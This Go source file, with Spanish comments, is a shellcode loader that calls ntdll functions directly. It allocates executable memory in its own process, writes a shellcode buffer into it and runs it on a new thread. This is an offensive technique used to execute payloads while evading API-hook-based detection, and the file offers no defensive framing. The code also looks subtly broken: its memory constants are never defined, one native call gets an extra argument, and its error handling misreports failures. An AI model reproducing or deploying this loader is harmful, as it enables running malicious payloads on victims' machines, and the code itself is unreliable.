package main

import (
	"syscall"
	"unsafe"
)

// Definir las estructuras y las funciones necesarias para DInvoke
type (
	HANDLE   uintptr
	PVOID    uintptr
	ULONG    uint32
	NTSTATUS int32
)

var (
	ntdll                   = syscall.NewLazyDLL("ntdll.dll")
	ntAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
	ntWriteVirtualMemory    = ntdll.NewProc("NtWriteVirtualMemory")
	ntCreateThreadEx        = ntdll.NewProc("NtCreateThreadEx")
	ntWaitForSingleObject   = ntdll.NewProc("NtWaitForSingleObject")
	ntFreeVirtualMemory     = ntdll.NewProc("NtFreeVirtualMemory")
)

func ExecuteShellcode(shellcode []byte) (uintptr, error) {
	var baseAddr PVOID
	var regionSize uintptr = uintptr(len(shellcode))

	status, _, _ := ntAllocateVirtualMemory.Call(
		uintptr(0xFFFFFFFFFFFFFFFF),          // ProcessHandle: -1 (proceso actual)
		uintptr(unsafe.Pointer(&baseAddr)),   // BaseAddress
		uintptr(0),                           // ZeroBits
		uintptr(unsafe.Pointer(&regionSize)), // RegionSize
		uintptr(MEM_COMMIT|MEM_RESERVE),      // AllocationType
		uintptr(PAGE_EXECUTE_READWRITE),      // Protect
		uintptr(0),                           // ProcessHandle
	)

	if status != 0 {
		return 0, syscall.Errno(status)
	}

	var bytesWritten ULONG
	status, _, _ = ntWriteVirtualMemory.Call(
		uintptr(0xFFFFFFFFFFFFFFFF),            // ProcessHandle: -1 (proceso actual)
		uintptr(baseAddr),                      // BaseAddress
		uintptr(unsafe.Pointer(&shellcode[0])), // Buffer
		uintptr(len(shellcode)),                // BufferLength
		uintptr(unsafe.Pointer(&bytesWritten)), // NumberOfBytesWritten
		0,                                      // Reserved
	)

	if status != 0 {
		// Liberar la memoria asignada en caso de error
		_, _, err := ntFreeVirtualMemory.Call(uintptr(0xFFFFFFFFFFFFFFFF), uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), uintptr(MEM_RELEASE))
		if err != nil {
			return 0, err
		}
		return 0, syscall.Errno(status)
	}

	var threadHandle HANDLE
	status, _, _ = ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		uintptr(0x1FFFFF),           // DesiredAccess
		uintptr(0),                  // ObjectAttributes
		uintptr(0xFFFFFFFFFFFFFFFF), // ProcessHandle
		uintptr(baseAddr),           // lpStartAddress
		uintptr(0),                  // lpParameter
		uintptr(0),                  // CreateSuspended
		uintptr(0),                  // StackZeroBits
		uintptr(0),                  // SizeOfStackCommit
		uintptr(0),                  // SizeOfStackReserve
		uintptr(0),                  // bytesBuffer
	)

	if status != 0 {
		// Liberar la memoria asignada en caso de error
		_, _, err := ntFreeVirtualMemory.Call(uintptr(0xFFFFFFFFFFFFFFFF), uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), uintptr(MEM_RELEASE))
		if err != nil {
			return 0, err
		}
		return 0, syscall.Errno(status)
	}

	status, _, _ = ntWaitForSingleObject.Call(
		uintptr(threadHandle), // hObject
		uintptr(0),            // bAlertable
		uintptr(0),            // dwMilliseconds
	)

	if status != 0 {
		// Liberar la memoria asignada en caso de error
		_, _, err := ntFreeVirtualMemory.Call(uintptr(0xFFFFFFFFFFFFFFFF), uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), uintptr(MEM_RELEASE))
		if err != nil {
			return 0, err
		}
		return 0, syscall.Errno(status)
	}

	return uintptr(baseAddr), nil
}
